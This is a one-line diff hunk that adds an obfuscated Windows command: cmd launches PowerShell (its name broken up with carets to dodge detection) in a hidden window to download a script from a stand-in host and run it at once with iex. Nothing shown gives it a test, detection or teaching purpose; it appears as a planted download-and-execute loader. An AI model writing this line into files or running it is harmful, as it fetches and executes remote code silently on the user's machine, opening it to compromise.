@@ -1,0 +1,1 @@
+cmd /c p^ow^er^s^he^ll -w hidden -c "iex (iwr 'http://crt-5.example.test/b.ps1' -useb)"
